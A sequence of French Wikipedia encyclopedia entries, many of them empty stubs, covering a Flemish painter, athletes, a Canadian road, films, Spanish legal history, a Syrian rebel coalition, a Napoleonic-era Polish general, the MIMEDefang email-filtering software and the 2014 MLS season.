</doc>
<doc id="7277051" url="https://fr.wikipedia.org/wiki?curid=7277051" title="Comtes de Montbéliard">
Comtes de Montbéliard



</doc>
<doc id="7277076" url="https://fr.wikipedia.org/wiki?curid=7277076" title="À nous deux !">
À nous deux !



</doc>
<doc id="7277093" url="https://fr.wikipedia.org/wiki?curid=7277093" title="Albert Bouts">
Albert Bouts

Albert Bouts (ou Aelbert, Albrecht Bouts, Aelbrecht Bouts), né vers 1452-1460, peut-être à Louvain, et mort à Louvain en 1549, est un peintre de sujets religieux. Il est le second fils de Dirk Bouts, aussi dit Dirk Bouts le Vieux, et le frère cadet de Dirk Bouts le Jeune.
Biographie.
Il est mentionné une première fois à Louvain en 1476 comme « mineur d'âge », c'est-à-dire ayant moins de vingt-cinq ans, Albert Bouts ne peut donc être né avant 1452. Il fut sans doute formé dans l'atelier de son père. En 1476, après la mort de celui-ci, il semble avoir quitté Louvain, peut-être pour achever sa formation chez un maître en dehors de la ville. On pourrait supposer que ce maître était Hugo van der Goes dont Albert Bouts semble avoir directement subi l'influence. En 1479, il est à nouveau mentionné à Louvain, comme "pictor ymaginum", ce qui indiquerait qu'il était alors maître indépendant. Il réside à Louvain jusqu'à sa mort. Il se marie deux fois, mais n'a pas de descendance.
Œuvres.
Aucune œuvre du peintre n'est signée; toutefois, une "Assomption de la Vierge", un triptyque conservé à Bruxelles, aux Musées royaux des beaux-arts de Belgique a été examinée en 1902 par Georges Hulin de Loo qui découvre sur le volet droit du triptyque de l’"Assomption" des armoiries parlantes de Bouts surmontées d'un A, et combinées avec les armes de la corporation de Saint-Luc, ce qui permet l'attribution.
Sur la base de la comparaison stylistique avec le triptyque de l’"'Assomption de la Vierge", on lui attribue un grand nombre de scènes religieuses, comme "L'Annonciation" (Munich, Alte Pinakothek) ou "La Déploration" (Francfort, musée historique de Francfort), ainsi que de petits tableaux de piété produits en série (d'après des modèles de Dirk Bouts), comme l’"Ecce Homo" (ou "Christ couronné d'épines") (église de l'abbaye de la Cambre) avec parfois en pendant la "Mater Dolorosa" (Aix-la-Chapelle, musée Suermondt-Ludwig; Londres, National Gallery).
Albert Bouts poursuit loin dans le la tradition de son père. L'atelier du père, puis du fils, se fait une spécialité de panneaux de dévotion. À partir de modèles en usage
dans l’atelier de son père ou d’ateliers voisins comme celui d’Hugo van der Goes, Albrecht crée plusieurs prototypes de Christ qui sont déclinés en panneaux autonomes, volets de diptyque ou de triptyque, avec de nombreuses variantes : de face, de trois-quarts à droite ou à gauche, sans ou avec les mains, tenant un roseau, couronné d’épines, montrant ses plaies, esquissant un geste de bénédiction.
Il lui emprunte un grand nombre d'éléments et même des compositions entières, qu'il reproduit telles quelles, comme la "Crucifixion" (Bruxelles, musées royaux des beaux-arts de Belgique), ou, souvent, de façon inversée comme "Le Repas chez Simon" (Bruxelles, Musées royaux des beaux-arts de Belgique), ou encore qu'il aménage avec quelques détails décoratifs mis au goût du jour par une inspiration italianisante, comme "La Dernière Cène" (Bruxelles, musées royaux des beaux-arts de Belgique). Les visages et les attitudes de certains personnages rappellent le style de Hugo van der Goes. Par contre, la vivacité de la ligne incisive, parfois même dure, les contours anguleux des personnages, des draperies et de divers motifs des paysages, les couleurs vives et claires, sont typiques de sa manière.
Il est aussi l'auteur de plusieurs "Pénitence de saint Jérôme".

</doc>
<doc id="7277094" url="https://fr.wikipedia.org/wiki?curid=7277094" title="Oksana Kondratyeva">
Oksana Kondratyeva

Oksana Kondratyeva (en russe Оксана Юрьевна Кондратьева, née le ) est une athlète russe, spécialiste du lancer du marteau. Elle est la fille de Youri Sedykh et de Lyudmila Kondratyeva et la demi-sœur d'Alexia Sedykh.
Biographie.
En , à Joukovski, Oksana Kondrateva améliore son record personnel et réalise la meilleure performance mondiale de l'année avec un lancer à . Elle participe aux Universiades d'été de Kazan et y obtient la médaille d'argent, derrière l'Américaine Jeneva McCall, avec la marque de .

</doc>
<doc id="7277100" url="https://fr.wikipedia.org/wiki?curid=7277100" title="Ischnura elegans">
Ischnura elegans



</doc>
<doc id="7277101" url="https://fr.wikipedia.org/wiki?curid=7277101" title="Ulrich III de Ferrette">
Ulrich III de Ferrette



</doc>
<doc id="7277103" url="https://fr.wikipedia.org/wiki?curid=7277103" title="Ulrich II de Ferrette">
Ulrich II de Ferrette



</doc>
<doc id="7277106" url="https://fr.wikipedia.org/wiki?curid=7277106" title="Route 331 (Terre-Neuve-et-Labrador)">
Route 331 (Terre-Neuve-et-Labrador)

La route 331 est une route tertiaire de la province de Terre-Neuve-et-Labrador, située dans le nord-est de l'île de Terre-Neuve. Elle est plus précisément située une soixantaine de kilomètres au nord de Gander. Elle est une route faiblement empruntée, reliant Gander Bay South à Boyd's Cove. Route alternative de la route 330, elle est nommée Gander Bay-Boyd's Cove Highway, mesure 28 kilomètres, et est une route asphaltée sur l'entièreté de son tracé.
Tracé.
L'extrémité nord-ouest de la 331 est située la route 340, au sud de Boyd's Cove. 14 kilomètres de Summerford. Elle se dirige vers l'est pendant 5 kilomètres contournant le "First Pond" (premier lac), puis elle croise la route 335 en direction de Farewell. La 331 adopte par la suite une orientation sud-est pour suivre la baie Gander pour 20 kilomètres traversant de nombreuses petites communautés le long de la baie. À Clarke's Head, elle bifurque vers l'est pour traverser une petite partie de la baie, puis pour se terminer de l'autre côté sur la route 330, au sud de Gander Bay, à Gander Bay South.

</doc>
<doc id="7277109" url="https://fr.wikipedia.org/wiki?curid=7277109" title="Le Bagnard (film)">
Le Bagnard (film)

Le Bagnard est un film français réalisé par Willy Rozier et sorti en 1951.
Synopsis.
Accusé de meurtre, un médecin marseillais a été envoyé au bagne : il s'évade et veut obtenir sa rédemption, au risque de redevenir bagnard.
Ce film est en partie tiré de l'histoire de Pierre Bougrat, un médecin français condamné pour meurtre à la réclusion au bagne de Guyane, que son évasion a rendu célèbre.

</doc>
<doc id="7277111" url="https://fr.wikipedia.org/wiki?curid=7277111" title="Johan Gastien">
Johan Gastien

Johan Gastien, né le à Niort (Deux-Sèvres), est un footballeur français. Il évolue au poste de milieu de terrain au Clermont Foot 63 où il est actuellement capitaine. Il est reconnu pour son engagement sur le terrain, son endurance et ses tacles glissés tranchants.
Il est le fils de Pascal Gastien, footballeur devenu entraîneur.
Carrière.
Début de carrière aux Chamois niortais.
Formé aux Chamois Niortais, Johan Gastien va jouer avec son club formateur, à l'âge de 20 ans, ses premières minutes en Ligue 2 le 28 mars 2008. Il va progressivement s'imposer comme un élément essentiel du renouveau sportif de ce club qui fut à l'époque relégué en National puis en CFA avant de retrouver sous l'impulsion de l'entraîneur Pascal Gastien, son père, le monde professionnel lors de la saison 2012/2013.
Développement au Dijon FCO.
En fin de contrat avec les Chamois niortais à l'été 2013, Johan Gastien dispose de plusieurs offres, notamment du Dijon FCO, de l'AS Saint-Étienne ou du Stade Malherbe de Caen. Il choisit le club bourguignon et s'engage pour trois ans. Il s'installe dans l'équipe-type de son nouveau club et réalise de bonnes prestations lui permettant d'être nommé pour le trophée du joueur du mois du championnat en . Le changement le plus important par rapport aux années précédentes est sa position sur le terrain qui est plus avancée qu'auparavant, dans un rôle de meneur de jeu.
Rebond au Stade brestois 29.
Lors du mercato hivernal 2017 et quelques jours après son ami Quentin Bernard, Gastien rejoint lui aussi le Stade brestois 29. Il signe un contrat de deux ans et demi.
Joueur important du Clermont foot 63.
Après avoir eu l'opportunité de signer en Chine, il décide de poursuivre sa carrière au Clermont Foot 63 lors du mercato 2018. Il rejoint son père, qui est l'entraîneur de l'équipe, et participe à la montée du club auvergnat en Ligue 1 à l'issue de la saison 2020/2021. Lors de la saison 2021/2022 il est un des joueurs clés du club, qui arrache son maintien dans l'élite. Il prolonge dans la foulée son contrat en Auvergne jusqu'en juin 2025. La saison 2022/2023 est celle de la confirmation pour le club avec une superbe huitième place en Ligue 1 et un exercice réussit pour le milieu défensif infatigable clermontois qui est alors l'un des joueurs clés au Clermont Foot 63 en se payant le luxe d'être le marathonien du championnat à 35 ans. Malheureusement, en 2023/2024 lors de la dernière saison du Clermont Foot 63 en Ligue 1, Johan Gastien ne va pas surnager bien que parfois très intéressant mais souvent décevant dans une équipe clermontoise qui n'y arrive pas et file en Ligue 2. Relégation synonyme de changement d'entraîneur car Pascal Gastien, son père qui avait permis au club de monter en Ligue 1 termine la saison en intermittence avec Sébastien Bichard qui deviendra le remplaçant au poste d'entraîneur au Clermont Foot 63 la saison suivante.
Palmarès.
Il remporte le groupe C du CFA en 2010 et est vice-champion de National en 2012 avec les Chamois niortais.
Lors de la saison 2020-2021, il est vice-champion de Ligue 2 et participe à la montée du Clermont Foot 63 en Ligue 1, une première historique pour le club.

</doc>
<doc id="7277112" url="https://fr.wikipedia.org/wiki?curid=7277112" title="Oksana Kondratieva">
Oksana Kondratieva



</doc>
<doc id="7277115" url="https://fr.wikipedia.org/wiki?curid=7277115" title="Tori-i">
Tori-i



</doc>
<doc id="7277128" url="https://fr.wikipedia.org/wiki?curid=7277128" title="La Légende de Ron Burgundy 2">
La Légende de Ron Burgundy 2



</doc>
<doc id="7277143" url="https://fr.wikipedia.org/wiki?curid=7277143" title="Lockridge">
Lockridge

Lockridge est un patronyme porté notamment par :

</doc>
<doc id="7277151" url="https://fr.wikipedia.org/wiki?curid=7277151" title="Novísima recopilación">
Novísima recopilación

La Novísima recopilación de leyes de España ("Très nouvelle compilation des lois d’Espagne" en français), éditée en 1805, est une systématisation du droit espagnol, également employée comme texte d’étude au cours du . Elle est l'héritière de la "" de 1567, plusieurs fois critiquée. Elle est le produit de travaux entamés au , dans un contexte de montée en importance des spécialistes de la codification et un renouveau du mouvement d'érudition.
Historique.
L’absence d’un corpus légal complet et à jour amène Charles IV d’Espagne en 1799 à demander à Juan de Reguera Valdelomar de préparer un nouveau supplément, la "Novísima recopilación". Pour réaliser ce travail, Valdelomar utilise le matériel de Lardizábal et de la commission de la compilation. Il achève ses travaux en 1802 et propose un plan distinct, dans une approche plus méthodique de la législation. Le projet est accepté et la "Novísima recopilación de las leyes de España" est promulguée le .
La "Novísima recopilación" devient un texte fondamental d’étude du droit, puisque les Bourbons parviennent à introduire dans les universités le droit royal, en particulier face au droit commun romain. Elle demeure le texte législatif en vigueur et de référence jusqu'à la promulgation du Code civil espagnol en 1889. 
Structure et contenu.
L’ouvrage regroupe et arrêts structurées en formant douze livres. Elle contient un index détaillé des sujets et dispositions. Les livres I à IX portent sur le droit administratif ainsi que sur l'organisation du Royaume. Le livre X détaille le droit civil alors que le livre XI concerne la procédure civile. Enfin, le livre XII traite du droit pénal.
Critiques.
Pour certains critiques, elle comporte de grandes lacunes et ne répond pas aux façons de faire et attentes de son temps, notamment parce qu'elle reprend le système de retranscription traditionnelle, abonde d’insuffisances et de contradictions, omet certaines lois ou en répète d’autres ou encore cite des auteurs sans indiquer les sources exactes. Cette approche est très différente de celle de la France qui met en place au cours de la même période, le Code civil napoléonien. Par exemple, Francisco Martínez Marina qualifie la "Novísima recopilación" de .

</doc>
<doc id="7277156" url="https://fr.wikipedia.org/wiki?curid=7277156" title="The Best (émission de télévision)">
The Best (émission de télévision)

 : Le Meilleur Artiste est une émission de télévision française de divertissement diffusée sur TF1 en 2013 et 2014 et présentée par Estelle Denis ainsi que Christophe Beaugrand.
Produite par Shine France, le format est adapté de l'émission de divertissement néerlandaise "Beat The Best", créée par le fondateur d'Endemol, John de Mol.
Le jury de l'émission est composé de Cynthia Akanga (qui prend la place de Lara Fabian lors de la deuxième saison), d'Arturo Brachetti, de Sébastien Stella et d'Alessandra Martines.
La première saison s'est terminée le après 8 épisodes diffusés le vendredi soir à 20h50. 
La diffusion de la deuxième saison a débuté le sur TF1 et s'est terminée le . En raison des mauvaises audiences, TF1 n'a pas commandé de saison 3.
Saisons, candidats et palmarès.
Saison 1 (2013).
La première saison a été diffusée du au , le vendredi à .
Les huit épisodes de l'émission ont été enregistrés dans un chapiteau de plus de situé sur l'Île Seguin à Boulogne-Billancourt.
Les Chilly and Fly, un couple québécois pratiquant la discipline du cadre russe, remportent cette première saison.
Saison 2 (2014).
Une saison 2 est confirmée et est diffusée au printemps 2014 . Lara Fabian est remplacée par Cynthia Akanga, pour cause d'indisponibilité.
Elle est diffusée entre le et le , sur TF1. En raison des faibles audiences, seulement 5 des 6 épisodes enregistrés sont diffusés à l'antenne.
Remi Martin, qui pratique le mât chinois, remporte cette seconde saison.
Audiences.
Les audiences moyennes de la première saison sont de 4,2 millions de téléspectateurs pour 22 % de parts d'audience.
La deuxième saison de "The Best" connaît une chute libre des audiences. TF1 a pris la décision de supprimer la diffusion d'un épisode et donc avancer la date de la finale.
Pour confirmation, la finale se déroulera le vendredi à 20h55 sur TF1 (et non le comme prévu).

</doc>
<doc id="7277166" url="https://fr.wikipedia.org/wiki?curid=7277166" title="Franklin Jacobs">
Franklin Jacobs

Franklin Jacobs (né le à Mullins) est un athlète américain, spécialiste du saut en hauteur.
Avec un record à 2,32 m, alors qu'il ne mesure que 1,73 m, il détient un des meilleurs différentiels de la spécialité avec le Suédois Stefan Holm.

</doc>
<doc id="7277168" url="https://fr.wikipedia.org/wiki?curid=7277168" title="Pseudorectes incertus">
Pseudorectes incertus



</doc>
<doc id="7277172" url="https://fr.wikipedia.org/wiki?curid=7277172" title="Pseudorectes ferrugineus">
Pseudorectes ferrugineus



</doc>
<doc id="7277175" url="https://fr.wikipedia.org/wiki?curid=7277175" title="Melanorectes">
Melanorectes



</doc>
<doc id="7277184" url="https://fr.wikipedia.org/wiki?curid=7277184" title="Coupe de Tunisie de football 1933-1934">
Coupe de Tunisie de football 1933-1934

La Coupe de Tunisie de football 1933-1934 est la de la coupe de Tunisie, une compétition à élimination directe mettant aux prises l’ensemble des clubs évoluant en Tunisie et engagés dans cette épreuve.
Elle est organisée par la Ligue de Tunisie de football (LTFA).

</doc>
<doc id="7277195" url="https://fr.wikipedia.org/wiki?curid=7277195" title="Front islamique syrien">
Front islamique syrien

Le Front islamique syrien était un rassemblement de groupes rebelles islamistes sunnites engagés dans la guerre civile syrienne, actif entre 2012 et 2013.
Le , les brigades du Front islamique syrien déclarent rejeter la Coalition nationale syrienne et affirme que cette organisation ne les représente pas.
Le Front islamique syrien est dissous en , ses groupes armés les plus importants rejoignent alors le Front islamique.
Idéologie.
Le Front islamique syrien est islamiste à dominante salafiste.
Composition.
Le FIS rassemble 11 groupes armés :
Selon Charles Lister, chercheur au Middle East Institute, le Front islamique syrien rassemble alors environ 25 % des forces de la rébellion syrienne.

</doc>
<doc id="7277196" url="https://fr.wikipedia.org/wiki?curid=7277196" title="Solenostemon hybrida">
Solenostemon hybrida



</doc>
<doc id="7277197" url="https://fr.wikipedia.org/wiki?curid=7277197" title="Winsor">
Winsor

Toponyme.

Windsor Forest, village.

</doc>
<doc id="7277203" url="https://fr.wikipedia.org/wiki?curid=7277203" title="Roobert Howe (soldat)">
Roobert Howe (soldat)



</doc>
<doc id="7277206" url="https://fr.wikipedia.org/wiki?curid=7277206" title="Joseph Tolinski">
Joseph Tolinski

Józef Toliński, né le près de Poznań et mort le , est un officier polonais, au service successivement de l'Autriche, de la république des Deux Nations, du duché de Varsovie, du Premier Empire et du royaume du Congrès.
Biographie.
Józef Toliński entre dans l'armée autrichienne en 1780. Sous-lieutenant en 1782, lieutenant deux ans plus tard, il combat les Turcs en 1789 et 1790 et devient capitaine cette même année. 
En 1792, il passe au service de la Pologne. En 1794, après l'échec de l'insurrection de Kościuszko, il se retire avec le grade de colonel. 
Il reprend du service lors de la création du duché de Varsovie en 1807 et devient colonel du de cavalerie le . Il commande ce régiment durant la campagne de Russie au sein de la brigade Sulkowski dans le corps de Joseph-Antoine Poniatowski. Au cours de cette campagne, il participe à la bataille de la Moskowa et au combat de Winkowo, puis, sous les ordres du général Zajączek, à la bataille de la Bérézina.
Nommé général de brigade du duché de Varsovie le , il prend le commandement de la de la de cavalerie légère du de cavalerie du général François-Étienne Kellermann. Il est grièvement blessé à la bataille de Leipzig. Commandant d'une brigade de cavalerie polonaise au service de la France le , il refuse de prendre le commandement d'une des brigades de la division polonaise du général Louis Michel Pac. 
Fait général de brigade dans l'armée française le , il combat à Arcis-sur-Aube (20 mars). 
Après avoir démissionné du service français en , à la suite de l'abdication de Napoléon, il regagne la Pologne et intègre l'armée du royaume du Congrès, dont il devient le chef d'état-major général le .
Distinctions.
Il est fait chevalier de la Légion d'honneur le , et officier du même ordre le . 
Il est également fait chevalier de l'ordre "Virtuti Militari" du duché de Varsovie à la fin de l'année 1813. 
Après son retour en Pologne en 1814, il est décoré de l'ordre de Saint-Stanislas de .

</doc>
<doc id="7277207" url="https://fr.wikipedia.org/wiki?curid=7277207" title="Józef Toliński">
Józef Toliński



</doc>
<doc id="7277208" url="https://fr.wikipedia.org/wiki?curid=7277208" title="Joseph de Tolinski">
Joseph de Tolinski



</doc>
<doc id="7277214" url="https://fr.wikipedia.org/wiki?curid=7277214" title="Ignace Vitzthumb">
Ignace Vitzthumb



</doc>
<doc id="7277216" url="https://fr.wikipedia.org/wiki?curid=7277216" title="Marcel Bescos">
Marcel Bescos

Marcel Bescos, né le à Oloron-Sainte-Marie et mort le à Castres, est un joueur de rugby à XIII international français évoluant au poste de pilier. Il est champion de France en rugby à XIII avec l'Albi en 1962. Il a également été capitaine de l'équipe de France. 
Biographie.
Doté d'un physique impressionnant, 102 kilos, Marcel Bescos a effectué l'essentiel de sa carrière sous les couleurs de l'Albi XIII avant de rejoindre en fin de carrière le XIII limouxin. Formant avec Vadon et Conti une première ligne efficace à Albi, il devient champion de France en 1962. 
C'est sous le maillot de l'équipe de France qu'il réalise également de grandes performances sportives. Devenant capitaine de la sélection, il est de la sélection qui a tenu en échec l'Australie en pour un match nul 8-8, ses adversaires Reg Gasnier et Johnny Raper confessant après la rencontre n'avoir jamais rencontré de pilier aussi fort, rapide et technique à la fois. Avec lui, la sélection tricolore s'impose à six reprises contre la Grande-Bretagne.
Après sa carrière sportive, il devient antiquaire et commercial aux établissements Mauriès.
Marcel Bescos meurt le à Castres d'une embolie pulmonaire.

</doc>
<doc id="7277217" url="https://fr.wikipedia.org/wiki?curid=7277217" title="Scorzonera humilis">
Scorzonera humilis

Scorzonera humilis, la Scorsonère des prés, Petite scorsonère ou Scorzonère humble, est une espèce de plante à fleurs de la famille des Astéracées (Composées).
Description.
C'est une plante herbacée.
Liste des variétés.
Selon (Attention liste brute contenant possiblement des synonymes) :
Statut.
En France, cette plante est protégée dans le Nord-Pas-de-Calais, en Alsace et dans l'Ain.

</doc>
<doc id="7277221" url="https://fr.wikipedia.org/wiki?curid=7277221" title="MIMEDefang">
MIMEDefang

MIMEDefang est un environnement de développement sous licence GPL pour le filtrage des courriers électroniques.
Il utilise l'API "Milter" de Sendmail, des programmes en Perl et un peu de code C comme liant afin de permettre à l'utilisateur d'écrire en Perl des filtres évolués pour les messages électroniques.
MIMEDefang peut être utilisé pour :
Historique.
À l'origine, MIMEDefant est un développement de Dianne Skoll financé par le Collège royal des médecins et chirurgiens du Canada en 2000 afin de les aider à endiguer le déluge de virus propagés par messagerie électronique sur le réseau du collège. Le logiciel fut conçu pour filtrer les pièces jointes et s'est tout d'abord nommé MIMESweeper, puis MIMEDefanger et, finalement, MIMEDefang. Dianne Skoll annonça la naissance de son programme au public le . Le , une version incorporant le support de SpamAssassin est publiée, permettant ainsi à MIMEDefang de filtrer à la fois les virus et les spams.
La société de Dianne Skoll, Roaring Penguin Software, commercialise un produit anti-spam appelé CanIt qui est construit au-dessus de la version libre de MIMEDefang.
Architecture.
La bibliothèque Milter intégrée à Sendmail utilise les threads POSIX pour implémenter des filtres concomitants.
Les filtres de MIMEDefang écrits en Perl emploient un modèle de processus créés par avance similaires à ceux du modèle traditionnel multi-processus du serveur HTTP Apache.
Aussi, MIMEDefang est constitué de trois composants :
Les utilisateurs de MIMEDefang écrivent leur politique de filtrage en Perl en utilisant l'environnement mis à disposition par mimedefang.pl. Ils n'ont pas à se soucier de la synchronisation entre les fils d'exécution car chaque filtre Perl s'exécute dans un processus à fil unique.
L'infrastructure fournie par mimedefang.pl implémente de manière assez proche l'API Milter, mais pas exactement. Elle met en place des outils forts pratiques pour parcourir et reconstruire les messages électroniques MIME afin que le développeur puisse se concentrer sur la politique de filtrage globale plutôt que sur les détails techniques de l'API.

</doc>
<doc id="7277222" url="https://fr.wikipedia.org/wiki?curid=7277222" title="Société d’exploitation industrielle des tabacs et des allumettes">
Société d’exploitation industrielle des tabacs et des allumettes



</doc>
<doc id="7277224" url="https://fr.wikipedia.org/wiki?curid=7277224" title="Braddon">
Braddon

Braddon est un patronyme porté notamment par :

</doc>
<doc id="7277229" url="https://fr.wikipedia.org/wiki?curid=7277229" title="Robert Gros">
Robert Gros



</doc>
<doc id="7277232" url="https://fr.wikipedia.org/wiki?curid=7277232" title="Matagonis de Matagonibus">
Matagonis de Matagonibus



</doc>
<doc id="7277233" url="https://fr.wikipedia.org/wiki?curid=7277233" title="Tikar (langue)">
Tikar (langue)

Le tikar (ou ndob, ndome, tikali, tikar de l'Est, tikari, tingkala) est une langue bantoïde septentrionale parlée par les Tikar au Cameroun dans plusieurs régions : la région de l'Adamaoua, le département du Mayo-Banyo, l'arrondissement de Bankim ; la région du Centre, le département de Mbam-et-Kim, l'arrondissement de Ngambè-Tikar, disséminés au nord-ouest de Yoko et au nord-ouest de Foumban ; la région de l'Ouest, le département du Noun, l'arrondissement de Magba ; la région du Nord-Ouest, le département du Donga-Mantung, dans une petite zone frontalière.
Le nombre de locuteurs a été estimé à (2005).

</doc>
<doc id="7277234" url="https://fr.wikipedia.org/wiki?curid=7277234" title="Greenan">
Greenan

Greenan est un patronyme porté notamment par :

</doc>
<doc id="7277237" url="https://fr.wikipedia.org/wiki?curid=7277237" title="Amicale laïque des Couëts Bouguenais">
Amicale laïque des Couëts Bouguenais

L’ALC Bouguenais est l'un des sept clubs sportifs de rink hockey de la Loire-Atlantique basé à Bouguenais (banlieue sud-ouest de Nantes). Durant la saison 2012-2013, le club a remporté le championnat de Nationale 2 Sud ( du rink hockey français), se promouvant en Nationale 1 pour la saison 2013-2014. C'est la première fois de l'histoire du club qu'une équipe atteint l'élite du rink hockey français.
Parcours.
Nationale 1.
Le club remporte le championnat de Nationale 2 de 2012-2013, ce qui lui permet d'accéder à la Nationale 1. Lors de la saison 2013-2014, le club joue au plus haut-niveau du championnat français. Le club est mathématiquement relégué à l'issue de la journée. Durant la saison, l'équipe perd certaines rencontres sur le plus faible des écarts tel que contre Ergué, un adversaire de leur niveau. Durant la saison l'effectif comprend notamment des joueurs étrangers tel que Roger Hierro, Marc Baldris et Oriol Mata. Ce dernier a été recruté en vue de la promotion en Nationale. Il permet notamment à son équipe de surprendre le champion de France en titre en ouvrant le score contre Saint-Omer. Durant la saison, les matchs de l'équipe première clôture les matchs des équipes réserves et jeune du club. 
Entraineur : Xavier Guillaume
Relégation.
Après sa saison en Nationale 1, le club se maintient en Nationale 2, bien qu'elle soit mise en difficulté lors de la saison 2017-2018.
Joueurs et personnalités du club.
Formation.
Des joueurs formés par Bouguenais sont prêtés à d'autres club afin de jouer en Nationale 1. Il s'agit du cas de Romain Averty et Valentin Bily qui sont recrutés par le Poiré sur vie lors de la période des transferts de 2019.
Infrastructure.
Le club de Bouguenais évolue dans la salle de la Neustrie. La salle chauffée a une capacité de 300 places assises, d'un club-house. 

</doc>
<doc id="7277238" url="https://fr.wikipedia.org/wiki?curid=7277238" title="Major League Soccer 2014">
Major League Soccer 2014

La Major League Soccer 2014 est la de la Major League Soccer, le championnat professionnel de soccer d'Amérique du Nord. Elle est composée de dix-neuf équipes (16 des États-Unis et 3 du Canada) pour la dernière fois de son histoire, puisque dès la saison 2015 le championnat comptera 21 équipes avec l'ajout d'une équipe à New York (New York City FC) et Orlando (Orlando City SC).
Trois des quatre places qualificatives des États-Unis pour la Ligue des champions de la CONCACAF 2015-2016 y sont attribuées : au vainqueur du Supporters' Shield et de l'autre association et au vainqueur de la Coupe de la Major League Soccer, tandis que la quatrième place est attribuée au vainqueur de la Lamar Hunt US Open Cup.
En raison de changements dans l’organisation du championnat canadien, la place qualificative pour la Ligue des champions de la CONCACAF 2015-2016 est attribuée exceptionnellement par le biais de la MLS. Ainsi, la meilleure équipe canadienne de la saison régulière se qualifie pour cette compétition.
La saison régulière débute le et se termine le . Les séries éliminatoires ont lieu dans la foulée.
Les 19 franchises participantes.
Entraîneurs et capitaines.
Durant l'intersaison, Frank Klopas est licencié du Fire de Chicago. Il rebondit à l'Impact de Montréal où il remplace Marco Schällibaum. Frank Yallop arrive lui à Chicago. Oscar Pareja passe lui des Rapids du Colorado au FC Dallas où Schellas Hyndman avait décidé ne pas continuer au club. Pablo Mastroeni arrive lui dans le Colorado. 
José Luis Real et Brian Bliss qui ont terminé la saison précédente en tant qu'intérimaires aux Chivas USA et au Crew de Columbus sont remplacés respectivement par Wilmer Cabrera et Gregg Berhalter. Jason Kreis ne prolonge pas au Real Salt Lake pour entraîner New York City qui débutera en MLS en 2015. Il est remplacé par Jeff Cassar. Martin Rennie est lui licencié des Whitecaps de Vancouver pour être remplacé par Carl Robinson.
Saison régulière.
Résultats.
Source : mlssoccer.com
Séries éliminatoires.
Règlement.
Pour les rencontres du premier tour, la quatrième équipe de la conférence de l'Ouest recevra la cinquième de cette même association. Il en est de même pour la conférence de l'Est.
Ce tour se déroule en un seul match, avec prolongation et tirs au but éventuels.
La meilleure équipe de chaque conférence affronte en demi-finale de conférence, l'équipe issue du premier tour de sa conférence, l'autre demi-finale de chaque conférence mettant aux prises les équipes ayant fini deuxième et troisième en phase régulière.
Les demi-finales et finales de conférence se déroulent par match aller-retour, avec match retour chez l'équipe la mieux classée. Cette année, la règle du but à l'extérieur est introduite pour la première fois dans l'histoire de la MLS. Ainsi, en cas d'égalité de buts à l'issue des deux matchs, l'équipe qui aura inscrit le plus de buts à l'extérieur se qualifie. Sinon, une prolongation de deux périodes de 15 minutes a alors lieu. Cette règle ne s'applique pas à la prolongation. Ainsi, quel que soit le nombre de buts inscrits en prolongation, si les deux équipes restent à égalité, une séance de tirs au but a lieu.
La finale MLS a lieu sur le terrain de la meilleure équipe en phase régulière.
Cette finale se déroule en un seul match, avec prolongation et tirs au but pour départager si nécessaire les équipes.
Le gagnant du championnat se qualifie pour la Ligue des champions de la CONCACAF 2015-2016. Le Galaxy de Los Angeles étant déjà qualifié pour cette compétition, avant de gagner le championnat, cette place est attribuée à la meilleure équipe de la saison régulière non qualifiée à savoir le Real Salt Lake.
Résultats.
Demi-finales de conférence.
Est.
"Le Revolution de la Nouvelle-Angleterre l'emporte par un score cumulé de 7-3."
"Les Red Bulls de New York l'emportent par un score cumulé de 3-2."
Ouest.
"Le Galaxy de Los Angeles l'emporte par un score cumulé de 5-0."
"Les Sounders de Seattle l'emportent par un score cumulé de 1-1, grâce à la règle du but à l'extérieur."
Finales de conférence.
Est.
"Le Revolution de la Nouvelle-Angleterre l'emporte par un score cumulé de 4-3."
Ouest.
"Le Galaxy de Los Angeles l'emporte par un score cumulé de 2-2, grâce à la règle du but à l'extérieur."
Statistiques individuelles.
Meilleurs buteurs.
Source : MLS
Meilleurs passeurs.
Source : MLS
Meilleurs gardiens.
Il faut avoir joué au moins 1000 minutes pour être classé.
Source : MLS
Récompenses individuelles.
Récompenses hebdomadaires.
But de la semaine.
Il n'y a pas de but de la semaine en semaine 15.
Source : MLS Goal of the Week 2014
Arrêt de la semaine.
Il n'y a pas d'arrêt de la semaine en semaine 15.
Source : MLS Save of the Week 2014

</doc>
<doc id="7277240" url="https://fr.wikipedia.org/wiki?curid=7277240" title="Nana Mizuki Live Castle×Journey -King-">
Nana Mizuki Live Castle×Journey -King-

Nana Mizuki Live Castle×Journey -King- est la musicale de la chanteuse et seiyū japonaise Nana Mizuki.
Présentation.
La vidéo sort au format DVD et Blu-ray le sous le label King Records. Elle sort le même jour que le DVD "Nana Mizuki Live Castle×Journey -Queen-". Il contient 2 Blu-ray ou 5 DVD, le contient le concert "NANA MIZUKI LIVE CASTLE KING'S NIGHT at Tokyo Dome" qui a eu lieu le , et le "NANA MIZUKI LIVE JOURNEY 2011 at Sendai Sun Plaza" qui a eu lieu le . Ce concert contient 45 pistes tandis que le second en a 42. Il arrive à l'Oricon et reste classé 3 semaines.

</doc>
<doc id="7277241" url="https://fr.wikipedia.org/wiki?curid=7277241" title="ALC Bouguenais">
ALC Bouguenais



</doc>
<doc id="7277242" url="https://fr.wikipedia.org/wiki?curid=7277242" title="Sana Saeed">
Sana Saeed

Sana Saeed (née le ) est une mannequin et actrice indienne ayant tourné dans des films de Bollywood. Elle a obtenu son premier rôle, lorsqu'elle était enfant, dans "Kuch Kuch Hota Hai", puis a continué dans la télévision dans "Har Dil Jo Pyar Karega" et "Badal". Elle est également apparue dans des émissions de télévision telles que "Babul Ka Aangann Chootey Na" et "Lo Ho Gayi Pooja Iss Ghar Ki". En 2012, Saeed fait ses débuts à l'âge adulte dans un rôle secondaire dans le film "Student of the Year" de Karan Johar, devenu succès commercial au box-office.
Carrière.
Enfance et télévision (1998-2009).
